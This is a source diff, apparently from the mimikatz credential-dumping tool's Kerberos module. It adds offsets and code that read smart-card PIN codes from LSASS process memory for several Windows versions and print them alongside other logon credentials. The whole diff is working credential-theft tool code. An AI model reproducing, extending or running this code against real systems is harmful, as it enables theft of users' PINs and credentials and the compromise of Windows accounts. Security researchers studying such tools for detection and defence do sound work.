@@ -36,6 +36,7 @@ const KERB_INFOS kerbHelper[] = {
 			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_2),
 			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, Tickets_3),
 		},
+		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION_51, pinCode),
 		sizeof(LIST_ENTRY) + sizeof(KIWI_KERBEROS_LOGON_SESSION_51),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, ServiceName),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_51, TargetName),
@@ -62,8 +63,9 @@ const KERB_INFOS kerbHelper[] = {
 			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
 			sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
 		},
+		sizeof(LIST_ENTRY) + FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pinCode),
 		sizeof(LIST_ENTRY) + sizeof(KIWI_KERBEROS_LOGON_SESSION),
-			FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, ServiceName),
+		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, ServiceName),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TargetName),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, DomainName),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_52, TargetDomainName),
@@ -88,6 +90,7 @@ const KERB_INFOS kerbHelper[] = {
 			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_2),
 			FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, Tickets_3),
 		},
+		FIELD_OFFSET(KIWI_KERBEROS_LOGON_SESSION, pinCode),
 		sizeof(KIWI_KERBEROS_LOGON_SESSION),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, ServiceName),
 		FIELD_OFFSET(KIWI_KERBEROS_INTERNAL_TICKET_6, TargetName),
@@ -125,6 +128,7 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN PKUHL_M_SEKURLSA_C
 {
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_MEMORY_ADDRESS aLocalMemory = {NULL, &hLocalMemory}, aLsassMemory = {NULL, cLsass->hLsassMem};
+	UNICODE_STRING pinCode;
 
 	if(kuhl_m_sekurlsa_kerberos_package.Module.isInit || kuhl_m_sekurlsa_utils_search_generic(cLsass, &kuhl_m_sekurlsa_kerberos_package.Module, KerberosReferences, sizeof(KerberosReferences) / sizeof(KULL_M_PATCH_GENERIC), &KerbLogonSessionListOrTable, NULL, &KerbOffsetIndex))
 	{
@@ -139,7 +143,15 @@ void CALLBACK kuhl_m_sekurlsa_enum_logon_callback_kerberos(IN PKUHL_M_SEKURLSA_C
 			if(aLocalMemory.address = LocalAlloc(LPTR, kerbHelper[KerbOffsetIndex].structSize))
 			{
 				if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, kerbHelper[KerbOffsetIndex].structSize))
+        {
 					kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) ((PBYTE) aLocalMemory.address + kerbHelper[KerbOffsetIndex].offsetCreds), logId, 0, externalCallback, externalCallbackData);
+					if(aLsassMemory.address = (*(PUNICODE_STRING *) ((PBYTE) aLocalMemory.address + kerbHelper[KerbOffsetIndex].offsetPin)))
+					{
+						aLocalMemory.address = &pinCode;
+						if(kull_m_memory_copy(&aLocalMemory, &aLsassMemory, sizeof(UNICODE_STRING)))
+							kuhl_m_sekurlsa_genericCredsOutput((PKIWI_GENERIC_PRIMARY_CREDENTIAL) &pinCode, logId, KUHL_SEKURLSA_CREDS_DISPLAY_PINCODE | ((cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_VISTA) ? KUHL_SEKURLSA_CREDS_DISPLAY_NODECRYPT : 0), externalCallback, externalCallbackData);
+					}
+        }
 				LocalFree(aLocalMemory.address);
 			}
 		}
